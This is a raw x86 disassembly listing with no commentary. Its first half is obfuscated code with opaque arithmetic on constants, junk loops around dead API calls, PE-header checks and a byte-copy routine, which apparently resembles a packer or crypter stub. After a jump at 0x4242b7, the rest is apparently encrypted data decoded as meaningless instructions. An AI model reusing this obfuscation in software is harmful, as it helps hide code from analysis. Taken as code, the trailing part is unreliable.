  423b59:	mov    ecx,DWORD PTR ds:0x42a472
  423b5f:	mov    ecx,DWORD PTR [ecx+0x198]
  423b65:	xor    eax,edi
  423b67:	add    eax,ebx
  423b69:	cmp    eax,DWORD PTR [ecx]
  423b6b:	jne    0x423b93
  423b71:	mov    eax,DWORD PTR [esp+0x18]
  423b75:	push   0xffffffff
  423b77:	push   0x70941f95
  423b7c:	xor    eax,edi
  423b7e:	add    eax,ebx
  423b80:	push   eax
  423b81:	push   0xf89c85a1
  423b86:	push   DWORD PTR [esp+0x1c]
  423b8a:	push   DWORD PTR [esp+0x2c]
  423b8e:	call   0x4224d2
  423b93:	push   DWORD PTR [esp+0xc]
  423b97:	push   DWORD PTR [esp+0x1c]
  423b9b:	call   0x401000
  423ba0:	mov    eax,DWORD PTR [esp+0x18]
  423ba4:	xor    eax,edi
  423ba6:	add    eax,ebx
  423ba8:	mov    ds:0x42a4fe,eax
  423bad:	mov    eax,DWORD PTR [esp+0x18]
  423bb1:	xor    eax,edi
  423bb3:	add    eax,ebx
  423bb5:	mov    ds:0x42a4f6,eax
  423bba:	mov    eax,DWORD PTR [esp+0x2c]
  423bbe:	test   eax,eax
  423bc0:	je     0x423d6c
  423bc6:	lea    eax,[esp+0x1b8]
  423bcd:	mov    DWORD PTR [esp+0x64],0xf152c3a
  423bd5:	push   eax
  423bd6:	mov    DWORD PTR [esp+0x78],0x712ed2f
  423bde:	mov    DWORD PTR [esp+0x74],0x373fc0d
  423be6:	push   0x42ae32
  423beb:	mov    DWORD PTR [esp+0x70],0x72670add
  423bf3:	call   DWORD PTR ds:0x42b312
  423bf9:	cmp    eax,0xffffffff
  423bfc:	jne    0x422c5a
  423c02:	push   0xf
  423c04:	lea    eax,[esp+0x44]
  423c08:	push   eax
  423c09:	push   0x42ae66
  423c0e:	push   0x42ae7a
  423c13:	push   0x42ae9e
  423c18:	call   esi
  423c1a:	imul   eax,eax,0x300000
  423c20:	cmp    eax,0x1b00000
  423c25:	jne    0x422c5a
  423c2b:	lea    eax,[esp+0x78]
  423c2f:	push   eax
  423c30:	push   0xffffffff
  423c32:	call   DWORD PTR ds:0x42b30a
  423c38:	test   eax,eax
  423c3a:	jne    0x422c5a
  423c40:	call   0x41b628
  423c45:	mov    eax,DWORD PTR [esp+0x34]
  423c49:	mov    eax,DWORD PTR [esp+0xc]
  423c4d:	mov    DWORD PTR [esp+0x30],eax
  423c51:	mov    eax,DWORD PTR [esp+0x18]
  423c55:	mov    DWORD PTR [esp+0xc],eax
  423c59:	mov    eax,eax
  423c5b:	mov    eax,ds:0x42a472
  423c60:	mov    ecx,DWORD PTR [eax+0x1c0]
  423c66:	mov    edx,DWORD PTR [ecx]
  423c68:	and    DWORD PTR [esp+0x14],0x0
  423c6d:	mov    esi,0xfabdbed4
  423c72:	add    edx,esi
  423c74:	adc    DWORD PTR [esp+0x14],0xffffffff
  423c79:	mov    ecx,0x8a29a141
  423c7e:	xor    edx,ecx
  423c80:	mov    DWORD PTR [esp+0x20],edx
  423c84:	mov    edx,DWORD PTR [esp+0x14]
  423c88:	xor    edx,0x0
  423c8b:	cmp    DWORD PTR [esp+0x20],0x70941f94
  423c93:	mov    DWORD PTR [esp+0x24],edx
  423c97:	jne    0x423ca6
  423c9d:	cmp    edx,0xffffffff
  423ca0:	je     0x423d0f
  423ca6:	mov    eax,DWORD PTR [eax+0x1c8]
  423cac:	mov    eax,DWORD PTR [eax]
  423cae:	cdq    
  423caf:	add    eax,esi
  423cb1:	adc    edx,0xffffffff
  423cb4:	and    DWORD PTR [esp+0x14],0x0
  423cb9:	xor    edx,0x0
  423cbc:	mov    DWORD PTR [esp+0x1c],edx
  423cc0:	mov    edx,DWORD PTR [esp+0xc]
  423cc4:	mov    DWORD PTR [esp+0x10],edx
  423cc8:	xor    eax,ecx
  423cca:	add    DWORD PTR [esp+0x10],esi
  423cce:	mov    edx,DWORD PTR [esp+0x10]
  423cd2:	adc    DWORD PTR [esp+0x14],0xffffffff
  423cd7:	xor    edx,ecx
  423cd9:	mov    DWORD PTR [esp+0x20],edx
  423cdd:	mov    edx,DWORD PTR [esp+0x14]
  423ce1:	xor    edx,0x0
  423ce4:	mov    DWORD PTR [esp+0x24],edx
  423ce8:	cmp    DWORD PTR [esp+0x20],eax
  423cec:	jne    0x423cfe
  423cf2:	mov    eax,DWORD PTR [esp+0x1c]
  423cf6:	cmp    edx,eax
  423cf8:	je     0x423d0f
  423cfe:	mov    eax,DWORD PTR [esp+0xc]
  423d02:	add    eax,DWORD PTR [esp+0x30]
  423d06:	mov    DWORD PTR [esp+0xc],eax
  423d0a:	jmp    0x423d6c
  423d0f:	mov    eax,ds:0x42a4f6
  423d14:	mov    edx,DWORD PTR ds:0x42a4fe
  423d1a:	xor    eax,edx
  423d1c:	mov    ds:0x42a4f6,eax
  423d21:	mov    edx,DWORD PTR ds:0x42a4f6
  423d27:	mov    eax,DWORD PTR [esp+0x2c]
  423d2b:	add    DWORD PTR [eax],edx
  423d2d:	mov    edx,DWORD PTR [esp+0xc]
  423d31:	mov    eax,ds:0x42a4f6
  423d36:	xor    edx,edi
  423d38:	add    edx,ebx
  423d3a:	xor    ebx,ebx
  423d3c:	add    edx,esi
  423d3e:	adc    ebx,0xffffffff
  423d41:	xor    edi,edi
  423d43:	xor    edx,ecx
  423d45:	xor    ebx,0x0
  423d48:	add    eax,esi
  423d4a:	adc    edi,0xffffffff
  423d4d:	xor    eax,ecx
  423d4f:	xor    edi,0x0
  423d52:	cmp    eax,edx
  423d54:	jne    0x423d6c
  423d5a:	cmp    edi,ebx
  423d5c:	jne    0x423d6c
  423d62:	mov    eax,ds:0x42a4f6
  423d67:	mov    ds:0x42a4fe,eax
  423d6c:	lea    eax,[esp+0x1b8]
  423d73:	push   eax
  423d74:	push   0x42aece
  423d79:	call   DWORD PTR ds:0x42b312
  423d7f:	cmp    eax,0xffffffff
  423d82:	jne    0x422c5a
  423d88:	push   0xf
  423d8a:	lea    eax,[esp+0x44]
  423d8e:	push   eax
  423d8f:	push   0x42af02
  423d94:	push   0x42af16
  423d99:	push   0x42af3a
  423d9e:	call   DWORD PTR ds:0x42b302
  423da4:	imul   eax,eax,0x300000
  423daa:	cmp    eax,0x1b00000
  423daf:	jne    0x422c5a
  423db5:	lea    eax,[esp+0x78]
  423db9:	push   eax
  423dba:	push   0xffffffff
  423dbc:	call   DWORD PTR ds:0x42b30a
  423dc2:	test   eax,eax
  423dc4:	jne    0x422c5a
  423dca:	mov    eax,ds:0x42a472
  423dcf:	push   0x4
  423dd1:	add    eax,0x1cc
  423dd6:	push   eax
  423dd7:	lea    eax,[esp+0x3c]
  423ddb:	push   eax
  423ddc:	call   0x423df0
  423de1:	mov    eax,DWORD PTR [esp+0x34]
  423de5:	mov    eax,DWORD PTR [eax]
  423de7:	pop    edi
  423de8:	pop    esi
  423de9:	pop    ebx
  423dea:	mov    esp,ebp
  423dec:	pop    ebp
  423ded:	ret    0xc
  423df0:	push   ebp
  423df1:	mov    ebp,esp
  423df3:	sub    esp,0x10
  423df6:	mov    eax,0xf89c85a5
  423dfb:	mov    DWORD PTR ds:0x42b222,0x14
  423e05:	cmp    DWORD PTR ds:0x42b222,0x0
  423e0c:	je     0x423e66
  423e12:	cmp    DWORD PTR ds:0x42b222,0x9
  423e19:	jbe    0x423e66
  423e1f:	jmp    0x423e38
  423e24:	push   0x42a03d
  423e29:	push   0x1
  423e2b:	push   0x1
  423e2d:	push   0x14be
  423e32:	call   DWORD PTR ds:0x42b2ee
  423e38:	cmp    DWORD PTR ds:0x42b222,0xa
  423e3f:	jne    0x423e54
  423e45:	xor    edx,edx
  423e47:	add    edx,DWORD PTR ds:0x42b222
  423e4d:	dec    edx
  423e4e:	mov    DWORD PTR ds:0x42b222,edx
  423e54:	mov    edx,DWORD PTR ds:0x42b222
  423e5a:	dec    edx
  423e5b:	mov    DWORD PTR ds:0x42b222,edx
  423e61:	jmp    0x423e05
  423e66:	mov    DWORD PTR [ebp-0x4],eax
  423e69:	and    DWORD PTR ds:0x42b1fa,0x0
  423e73:	jmp    0x423e85
  423e78:	mov    edx,DWORD PTR ds:0x42b1fa
  423e7e:	inc    edx
  423e7f:	mov    DWORD PTR ds:0x42b1fa,edx
  423e85:	cmp    DWORD PTR ds:0x42b1fa,0x19
  423e8c:	jae    0x423ece
  423e92:	cmp    DWORD PTR ds:0x42b1fa,0xc
  423e99:	jg     0x423ece
  423e9f:	jmp    0x423eaf
  423ea4:	push   0x863f
  423ea9:	call   DWORD PTR ds:0x42b2f2
  423eaf:	cmp    DWORD PTR ds:0x42b1fa,0xb
  423eb6:	jne    0x423ec9
  423ebc:	mov    edx,DWORD PTR ds:0x42b1fa
  423ec2:	inc    edx
  423ec3:	mov    DWORD PTR ds:0x42b1fa,edx
  423ec9:	jmp    0x423e78
  423ece:	mov    DWORD PTR [ebp-0x8],0xf89c85a2
  423ed5:	mov    edx,DWORD PTR ds:0x42b1aa
  423edb:	or     edx,DWORD PTR ds:0x42b1da
  423ee1:	mov    DWORD PTR ds:0x42b1aa,edx
  423ee7:	mov    ecx,DWORD PTR [ebp-0x4]
  423eea:	not    edx
  423eec:	push   esi
  423eed:	and    edx,esi
  423eef:	mov    edx,0x75108ae
  423ef4:	xor    ecx,edx
  423ef6:	adc    DWORD PTR ds:0x42b18e,ebx
  423efc:	mov    esi,0x3272f5
  423f01:	and    DWORD PTR ds:0x42b186,0x14f5
  423f0b:	push   edi
  423f0c:	adc    edi,DWORD PTR ds:0x42b1c2
  423f12:	mov    edi,DWORD PTR [ebp+0x10]
  423f15:	xor    DWORD PTR ds:0x42b1fa,0x42b1ce
  423f1f:	add    ecx,esi
  423f21:	mov    DWORD PTR ds:0x42b1da,0x1b10
  423f2b:	cmp    ecx,edi
  423f2d:	mov    DWORD PTR ds:0x42b1d6,0x199
  423f37:	je     0x42401c
  423f3d:	xor    edi,ecx
  423f3f:	mov    ecx,DWORD PTR [ebp-0x4]
  423f42:	sbb    DWORD PTR ds:0x42b202,0x792c
  423f4c:	mov    edi,DWORD PTR [ebp+0x10]
  423f4f:	sub    DWORD PTR ds:0x42b1ba,0xd36
  423f59:	xor    eax,eax
  423f5b:	xor    ecx,edx
  423f5d:	xor    DWORD PTR ds:0x42b216,0x49be
  423f67:	add    ecx,esi
  423f69:	add    edi,0xfabdbed4
  423f6f:	adc    eax,0xffffffff
  423f72:	xor    eax,0x0
  423f75:	mov    DWORD PTR [ebp-0xc],eax
  423f78:	push   ebx
  423f79:	xor    ebx,ebx
  423f7b:	xor    edi,0x8a29a141
  423f81:	mov    eax,ecx
  423f83:	add    eax,0xfabdbed4
  423f88:	adc    ebx,0xffffffff
  423f8b:	xor    eax,0x8a29a141
  423f90:	xor    ebx,0x0
  423f93:	cmp    eax,edi
  423f95:	jne    0x423fae
  423f9b:	cmp    ebx,DWORD PTR [ebp-0xc]
  423f9e:	je     0x424016
  423fa4:	jmp    0x423fae
  423fa9:	mov    esi,0x3272f5
  423fae:	mov    eax,DWORD PTR [ebp-0x4]
  423fb1:	mov    edi,DWORD PTR [ebp-0x8]
  423fb4:	xor    edi,edx
  423fb6:	add    edi,esi
  423fb8:	mov    esi,DWORD PTR [ebp+0x8]
  423fbb:	imul   edi,ecx
  423fbe:	mov    ebx,DWORD PTR [ebp+0xc]
  423fc1:	xor    eax,edx
  423fc3:	add    eax,ecx
  423fc5:	mov    al,BYTE PTR [ebx+eax*1+0x3272f5]
  423fcc:	mov    BYTE PTR [edi+esi*1],al
  423fcf:	mov    eax,DWORD PTR [ebp-0x8]
  423fd2:	mov    esi,DWORD PTR [ebp+0x10]
  423fd5:	xor    eax,edx
  423fd7:	xor    ebx,ebx
  423fd9:	add    esi,0xfabdbed4
  423fdf:	adc    ebx,0xffffffff
  423fe2:	lea    ecx,[ecx+eax*1+0x3272f5]
  423fe9:	xor    edi,edi
  423feb:	xor    esi,0x8a29a141
  423ff1:	xor    ebx,0x0
  423ff4:	mov    eax,ecx
  423ff6:	add    eax,0xfabdbed4
  423ffb:	adc    edi,0xffffffff
  423ffe:	xor    eax,0x8a29a141
  424003:	xor    edi,0x0
  424006:	cmp    eax,esi
  424008:	jne    0x423fa9
  42400e:	cmp    edi,ebx
  424010:	jne    0x423fa9
  424016:	mov    eax,0xf89c85a2
  42401b:	pop    ebx
  42401c:	pop    edi
  42401d:	pop    esi
  42401e:	leave  
  42401f:	ret    0xc
  424022:	push   ebp
  424023:	mov    ebp,esp
  424025:	push   ecx
  424026:	and    DWORD PTR ds:0x42b19e,0x0
  424030:	jmp    0x424043
  424035:	xor    eax,eax
  424037:	xor    eax,DWORD PTR ds:0x42b19e
  42403d:	inc    eax
  42403e:	mov    ds:0x42b19e,eax
  424043:	cmp    DWORD PTR ds:0x42b19e,0x14
  42404a:	jae    0x424072
  424050:	cmp    DWORD PTR ds:0x42b19e,0x1e
  424057:	jg     0x424072
  42405d:	jmp    0x42406d
  424062:	push   0x42b182
  424067:	call   DWORD PTR ds:0x42b2f6
  42406d:	jmp    0x424035
  424072:	mov    DWORD PTR [ebp-0x4],0xf89c85a5
  424079:	and    DWORD PTR ds:0x42b1b2,0x0
  424083:	xor    ecx,ecx
  424085:	xor    ecx,DWORD PTR ds:0x42b1b2
  42408b:	inc    ecx
  42408c:	mov    DWORD PTR ds:0x42b1b2,ecx
  424092:	cmp    DWORD PTR ds:0x42b1b2,0x4
  424099:	jle    0x4240e5
  42409f:	jmp    0x4240be
  4240a4:	push   0x42b206
  4240a9:	push   0x42b1c6
  4240ae:	push   0x6e36
  4240b3:	push   0x42a0fe
  4240b8:	call   DWORD PTR ds:0x42b2fa
  4240be:	cmp    DWORD PTR ds:0x42b1b2,0x3
  4240c5:	jne    0x4240d8
  4240cb:	mov    ecx,DWORD PTR ds:0x42b1b2
  4240d1:	inc    ecx
  4240d2:	mov    DWORD PTR ds:0x42b1b2,ecx
  4240d8:	cmp    DWORD PTR ds:0x42b1b2,0x1b
  4240df:	jb     0x424083
  4240e5:	mov    eax,DWORD PTR [ebp+0x8]
  4240e8:	movsx  eax,BYTE PTR [eax]
  4240eb:	mov    edx,0x3272f5
  4240f0:	sub    eax,edx
  4240f2:	mov    ecx,0x75108ae
  4240f7:	xor    eax,ecx
  4240f9:	cmp    eax,0xf89c85f6
  4240fe:	jne    0x42412d
  424104:	mov    eax,DWORD PTR [ebp+0x8]
  424107:	push   esi
  424108:	mov    esi,DWORD PTR [ebp+0x8]
  42410b:	add    esi,DWORD PTR [eax+0x3c]
  42410e:	mov    DWORD PTR [ebp+0x8],esi
  424111:	mov    eax,DWORD PTR [ebp-0x4]
  424114:	mov    esi,DWORD PTR [ebp+0x8]
  424117:	xor    eax,ecx
  424119:	add    eax,edx
  42411b:	cmp    DWORD PTR [esi+0x54],eax
  42411e:	pop    esi
  42411f:	je     0x42412d
  424125:	mov    eax,DWORD PTR [ebp+0x8]
  424128:	jmp    0x424134
  42412d:	mov    eax,DWORD PTR [ebp-0x4]
  424130:	xor    eax,ecx
  424132:	add    eax,edx
  424134:	leave  
  424135:	ret    0x4
  424138:	push   ebp
  424139:	mov    ebp,esp
  42413b:	sub    esp,0xc
  42413e:	and    DWORD PTR ds:0x42b1c6,0x0
  424148:	jmp    0x42415a
  42414d:	mov    edx,DWORD PTR ds:0x42b1c6
  424153:	inc    edx
  424154:	mov    DWORD PTR ds:0x42b1c6,edx
  42415a:	cmp    DWORD PTR ds:0x42b1c6,0x1b
  424161:	jae    0x4241a8
  424167:	cmp    DWORD PTR ds:0x42b1c6,0xd
  42416e:	jle    0x4241a8
  424174:	jmp    0x424189
  424179:	push   0x42b216
  42417e:	push   0x42a1f3
  424183:	call   DWORD PTR ds:0x42b2fe
  424189:	cmp    DWORD PTR ds:0x42b1c6,0xc
  424190:	jne    0x4241a3
  424196:	mov    edx,DWORD PTR ds:0x42b1c6
  42419c:	inc    edx
  42419d:	mov    DWORD PTR ds:0x42b1c6,edx
  4241a3:	jmp    0x42414d
  4241a8:	push   esi
  4241a9:	and    DWORD PTR ds:0x42b222,0x0
  4241b3:	xor    esi,esi
  4241b5:	or     esi,DWORD PTR ds:0x42b222
  4241bb:	inc    esi
  4241bc:	mov    DWORD PTR ds:0x42b222,esi
  4241c2:	cmp    DWORD PTR ds:0x42b222,0x7
  4241c9:	jl     0x424211
  4241cf:	jmp    0x4241ea
  4241d4:	push   DWORD PTR [ebp-0x28]
  4241d7:	push   DWORD PTR [ebp-0x24]
  4241da:	push   0x42a1b7
  4241df:	push   0x400000
  4241e4:	call   DWORD PTR ds:0x42b306
  4241ea:	cmp    DWORD PTR ds:0x42b222,0x6
  4241f1:	jne    0x424204
  4241f7:	mov    esi,DWORD PTR ds:0x42b222
  4241fd:	inc    esi
  4241fe:	mov    DWORD PTR ds:0x42b222,esi
  424204:	cmp    DWORD PTR ds:0x42b222,0x15
  42420b:	jb     0x4241b3
  424211:	mov    esi,0xf89c85a5
  424216:	or     DWORD PTR ds:0x42b1d6,0x459e
  424220:	mov    DWORD PTR [ebp-0x8],esi
  424223:	and    DWORD PTR ds:0x42b1d6,0x0
  42422d:	jmp    0x424241
  424232:	xor    ecx,ecx
  424234:	xor    ecx,DWORD PTR ds:0x42b1d6
  42423a:	inc    ecx
  42423b:	mov    DWORD PTR ds:0x42b1d6,ecx
  424241:	cmp    DWORD PTR ds:0x42b1d6,0x1c
  424248:	jae    0x42428f
  42424e:	cmp    DWORD PTR ds:0x42b1d6,0xf
  424255:	jge    0x42428f
  42425b:	jmp    0x424270
  424260:	push   0x42a1a1
  424265:	push   0x0
  424267:	push   DWORD PTR [ebp-0x20]
  42426a:	call   DWORD PTR ds:0x42b30e
  424270:	cmp    DWORD PTR ds:0x42b1d6,0xe
  424277:	jne    0x42428a
  42427d:	mov    ecx,DWORD PTR ds:0x42b1d6
  424283:	inc    ecx
  424284:	mov    DWORD PTR ds:0x42b1d6,ecx
  42428a:	jmp    0x424232
  42428f:	mov    DWORD PTR [ebp-0x4],0xf89c85a2
  424296:	push   edi
  424297:	mov    eax,eax
  424299:	mov    eax,DWORD PTR [ebp-0x4]
  42429c:	mov    edi,DWORD PTR [ebp-0x8]
  42429f:	mov    ecx,0x75108ae
  4242a4:	xor    eax,ecx
  4242a6:	xor    edi,ecx
  4242a8:	mov    edx,0x3272f5
  4242ad:	add    edi,edx
  4242af:	add    eax,edx
  4242b1:	imul   eax,edi
  4242b4:	mov    edi,DWORD PTR [ebp+0xc]
  4242b7:	jmp    0x425869
  4242bc:	jge    0x42427f
  4242be:	jnp    0x42427a
  4242c0:	mov    bh,0xb2
  4242c2:	mov    dl,0xbe
  4242c4:	jmp    0x712776ec
  4242c9:	and    BYTE PTR [edx-0x7f6a6da2],cl
  4242cf:	sub    esp,0x6c
  4242d2:	add    DWORD PTR [ebx+0x3a238a5b],0xffffffe7
  4242d9:	sahf   
  4242da:	mov    dl,0xc0
  4242dc:	xchg   BYTE PTR [edi-0x3882ca7f],bl
  4242e2:	cdq    
  4242e3:	out    dx,al
  4242e4:	mov    eax,0x8db3d680
  4242e9:	aas    
  4242ea:	mov    BYTE PTR [edi+0x6c7d0c26],dh
  4242f0:	pop    esp
  4242f1:	(bad)  
  4242f2:	adc    cl,BYTE PTR [eax+edi*4+0x23]
  4242f6:	pop    ebx
  4242f7:	jecxz  0x4242a9
  4242f9:	jmp    0x42430f
  4242fb:	push   edx
  4242fc:	jge    0x42427f
  4242fe:	add    al,0x97
  424300:	jmp    0x4242b8
  424302:	add    eax,0xcf9893c3
  424307:	dec    ecx
  424308:	shl    BYTE PTR [edi],cl
  42430a:	pop    eax
  42430b:	and    al,0x6c
  42430d:	cmp    BYTE PTR [esi+0x78],bl
  424310:	out    0x32,eax
  424312:	jae    0x424354
  424314:	push   ebx
  424315:	std    
  424316:	xchg   ebp,eax
  424317:	sbb    eax,0x2a17f976
  42431c:	out    0xf2,al
  42431e:	adc    al,0x2
  424320:	fst    QWORD PTR [edx]
  424322:	ret    0x11cc
  424325:	ins    DWORD PTR es:[edi],dx
  424326:	sub    DWORD PTR [ebp+0x35],edx
  424329:	ret    0x7338
  42432c:	icebp  
  42432d:	sub    BYTE PTR [ecx-0x65da3087],ah
  424333:	mov    al,0xc9
  424335:	dec    edi
  424336:	aaa    
  424337:	in     eax,0x95
  424339:	jmp    0x424341
  42433b:	adc    BYTE PTR [edx+0x5f805ca9],dh
  424341:	not    BYTE PTR [ebp+0x244c2ae9]
  424347:	mov    ds,ecx
  424349:	inc    esp
  42434a:	scas   al,BYTE PTR es:[edi]
  42434b:	int    0x25
  42434d:	or     al,0x82
  42434f:	ret    0xb04e
  424352:	jecxz  0x424317
  424354:	jns    0x424375
  424356:	loopne 0x4243ce
  424358:	xor    BYTE PTR [esi],dl
  42435a:	mov    dh,0x9
  42435c:	mov    al,0x2a
  42435e:	stc    
  42435f:	nop
  424360:	sbb    BYTE PTR [eax+0x6d],cl
  424363:	or     BYTE PTR [edi-0x3d9528a1],cl
  424369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42436a:	xchg   ebx,eax
  42436b:	or     ecx,DWORD PTR [esi+ebp*8-0x74]
  42436f:	retf   0x2182
  424372:	jno    0x4243a6
  424374:	jo     0x4243ad
  424376:	(bad)  
  424377:	ins    BYTE PTR es:[edi],dx
  424378:	and    al,dl
  42437a:	cmp    eax,0xb7cae062
  42437f:	in     eax,dx
  424380:	mov    ah,0xa2
  424382:	addr16 cli 
  424384:	fcomp  DWORD PTR [edi+0x28f8a73a]
  42438a:	stos   BYTE PTR es:[edi],al
  42438b:	sub    dh,BYTE PTR ds:[ebp+0x19fe8aee]
  424392:	call   0x5b29:0xce333553
  424399:	outs   dx,DWORD PTR ds:[esi]
  42439a:	clc    
  42439b:	sub    ecx,DWORD PTR [ecx-0x27]
  42439e:	sbb    ah,BYTE PTR [ecx]
  4243a0:	lahf   
  4243a1:	int3   
  4243a2:	fstp   QWORD PTR [edx]
  4243a4:	mov    edi,0x886c1a3b
  4243a9:	bound  eax,QWORD PTR [edi+edx*2]
  4243ac:	sahf   
  4243ad:	push   ss
  4243ae:	and    eax,0xd6166d30
  4243b3:	aas    
  4243b4:	xlat   BYTE PTR ds:[ebx]
  4243b5:	ror    DWORD PTR [esi],0x61
  4243b8:	fwait
  4243b9:	js     0x4243d4
  4243bb:	push   ss
  4243bc:	cmp    BYTE PTR [esi+0x47],bh
  4243bf:	and    cl,BYTE PTR [ebp-0x63]
  4243c2:	shl    DWORD PTR [ebx+eiz*8-0x31939d3d],0xb1
  4243ca:	sbb    bl,BYTE PTR [ebp-0x3b]
  4243cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243ce:	mov    dh,0xbc
  4243d0:	ins    DWORD PTR es:[edi],dx
  4243d1:	mov    esp,0x776bdb40
  4243d6:	clc    
  4243d7:	adc    al,0xcc
  4243d9:	mov    ds:0x3dfeb39,eax
  4243de:	push   0xcd56dd70
  4243e3:	(bad)  [ebx+eax*8+0x77514d8c]
  4243ea:	mov    al,0x3e
  4243ec:	or     al,0x1a
  4243ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4243ef:	inc    eax
  4243f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243f1:	int3   
  4243f2:	adc    BYTE PTR [esi+0x7a],dl
  4243f5:	push   0xffffffb3
  4243f7:	xchg   esp,eax
  4243f8:	jmp    0x623b:0x5b9c9c7c
  4243ff:	jle    0x424389
  424401:	(bad)  
  424402:	sbb    eax,DWORD PTR [esi+0x67]
  424405:	retf   0xfe11
  424408:	fld1   
  42440a:	addr16 (bad) 
  42440c:	push   ecx
  42440d:	jg     0x4243f6
  42440f:	mov    cl,0x77
  424411:	mov    esp,0x21c2134
  424416:	push   ebx
  424417:	cmp    BYTE PTR [edi-0x6bf49441],bh
  42441d:	adc    eax,0xc2ec4e3
  424422:	fisub  WORD PTR [esi+eax*8+0xb]
  424426:	mov    eax,ds:0xe40efb7d
  42442b:	push   ebp
  42442c:	enter  0x612c,0x7d
  424430:	out    dx,eax
  424431:	add    DWORD PTR [edx-0xdceb520],0x36
  424438:	and    dl,ah
  42443a:	rcr    BYTE PTR [edi],cl
  42443c:	bound  edi,QWORD PTR [esi]
  42443e:	pushf  
  42443f:	add    al,cl
  424441:	es retf 
  424443:	mov    bh,BYTE PTR [esi+0x26]
  424446:	xor    bl,BYTE PTR [ebp-0x54]
  424449:	cli    
  42444a:	dec    ebp
  42444b:	pop    esp
  42444c:	sub    DWORD PTR [edi-0x7efb7419],eax
  424452:	shl    DWORD PTR [edi],cl
  424454:	cmp    al,0xbf
  424456:	cmp    eax,0xb6ba2234
  42445b:	arpl   WORD PTR [esi-0x26a87cd4],bp
  424461:	test   eax,0xa22257cc
  424466:	pusha  
  424467:	sub    dl,BYTE PTR [eax+0x69be872a]
  42446d:	ja     0x4244bd
  42446f:	cmc    
  424470:	ret    
  424471:	cwde   
  424472:	mov    ds:0x38316641,al
  424477:	pop    es
  424478:	xor    ah,BYTE PTR [eax-0x2]
  42447b:	outs   dx,BYTE PTR ds:[esi]
  42447c:	out    dx,eax
  42447d:	and    eax,0xee99ca8e
  424482:	cwde   
  424483:	push   ecx
  424484:	leave  
  424485:	jbe    0x4244ec
  424487:	add    eax,DWORD PTR [ecx+ebx*1]
  42448a:	adc    cl,BYTE PTR [edi+0x42]
  42448d:	jmp    0xfa2:0xb09dfcd9
  424494:	mov    ebx,0xd5fab8a6
  424499:	jecxz  0x424422
  42449b:	and    BYTE PTR [eax+0x25],0x23
  42449f:	mov    esi,0x2bd8aa0c
  4244a4:	call   edx
  4244a6:	push   ds
  4244a7:	pop    ebx
  4244a8:	xor    BYTE PTR ds:0xde0b0768,dl
  4244ae:	add    al,0x36
  4244b0:	jge    0x424485
  4244b2:	mov    ecx,DWORD PTR [eax]
  4244b4:	mov    dh,0x26
  4244b6:	pop    esp
  4244b7:	test   dl,0x3f
  4244ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4244bb:	push   esp
  4244bc:	daa    
  4244bd:	add    cl,0xfb
  4244c0:	push   eax
  4244c1:	add    esp,DWORD PTR [ecx-0x79be71a0]
  4244c7:	(bad)  
  4244c8:	in     eax,dx
  4244c9:	hlt    
  4244ca:	call   0xbff5:0xdc0c0c93
  4244d1:	sbb    eax,0x3d14eb0e
  4244d6:	inc    esi
  4244d7:	mov    ebp,0xa16a2b90
  4244dc:	jge    0x42453d
  4244de:	fistp  DWORD PTR [ebx-0x22]
  4244e1:	pop    ss
  4244e2:	lea    ebp,[edx+0xd3a7ab4]
  4244e8:	shl    al,0xaf
  4244eb:	mov    ch,0xdf
  4244ed:	les    esi,FWORD PTR [edi]
  4244ef:	dec    esp
  4244f0:	nop
  4244f1:	mov    eax,ds:0xabb7620a
  4244f6:	mov    ecx,0x519e095a
  4244fb:	aad    0xa6
  4244fd:	adc    esi,edx
  4244ff:	sub    BYTE PTR [ebp+0x648331d4],bl
  424505:	and    dl,BYTE PTR [ecx+0x4bb239e3]
  42450b:	fcom   QWORD PTR [edi+edi*4]
  42450e:	mov    ecx,0x98e60cf9
  424513:	and    edx,edi
  424515:	arpl   WORD PTR [eax+0x14],si
  424518:	sub    eax,0x73aad63e
  42451d:	push   cs
  42451e:	retf   
  42451f:	jg     0x4244a3
  424521:	sbb    BYTE PTR [esi+eiz*1+0x57732a99],dl
  424528:	inc    ebx
  424529:	(bad)  
  42452a:	pop    ss
  42452b:	dec    ebx
  42452c:	pop    ebp
  42452d:	push   ebx
  42452e:	jno    0x4244dd
  424530:	mov    esp,0x543f0d9d
  424535:	call   0x8b671877
  42453a:	ret    
  42453b:	jp     0x4245a6
  42453d:	or     al,0x5a
  42453f:	push   ss
  424540:	mov    dh,0xe8
  424542:	movlps xmm5,QWORD PTR [eax]
  424545:	nop
  424546:	call   0x31d14fd
  42454b:	iret   
  42454c:	push   ebx
  42454d:	pop    ebp
  42454e:	out    dx,al
  42454f:	stc    
  424550:	mov    edx,DWORD PTR [ecx+0x1f]
  424553:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424554:	cld    
  424555:	mov    ebx,0xc8c6504b
  42455a:	mov    DWORD PTR [ebp-0x5e],ebp
  42455d:	out    0xfb,al
  42455f:	xchg   esi,eax
  424560:	jmp    FWORD PTR [eax]
  424562:	mov    edx,0xcf39123e
  424567:	cld    
  424568:	les    esi,FWORD PTR [esp+esi*8]
  42456b:	(bad)  [ebx+esi*2+0x5fce7198]
  424572:	dec    edx
  424573:	adc    DWORD PTR [eax+0x40],esi
  424576:	sahf   
  424577:	mov    al,ds:0xde16301a
  42457c:	arpl   WORD PTR [edi],cx
  42457e:	cli    
  42457f:	inc    ebp
  424580:	enter  0x4e71,0x14
  424584:	pop    ebp
  424585:	jb     0x42458c
  424587:	mov    ?,WORD PTR [edx+0x3f3aed34]
  42458d:	mov    dl,0x27
  42458f:	adc    al,BYTE PTR [edx-0x7a919bf6]
  424595:	mov    dh,0x95
  424597:	dec    ebx
  424598:	stc    
  424599:	pop    ebp
  42459a:	ins    DWORD PTR es:[edi],dx
  42459b:	sahf   
  42459c:	dec    ecx
  42459d:	imul   edi,DWORD PTR [esi+eiz*8],0xa
  4245a1:	push   esi
  4245a2:	xchg   esp,eax
  4245a3:	retf   
  4245a4:	or     eax,edx
  4245a6:	sahf   
  4245a7:	adc    ecx,edi
  4245a9:	jno    0x4245f9
  4245ab:	(bad)  
  4245ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4245ae:	loopne 0x4245cb
  4245b0:	aam    0xac
  4245b2:	or     BYTE PTR [ecx-0x212ad63e],cl
  4245b8:	pop    esp
  4245b9:	mov    eax,ds:0xb386e904
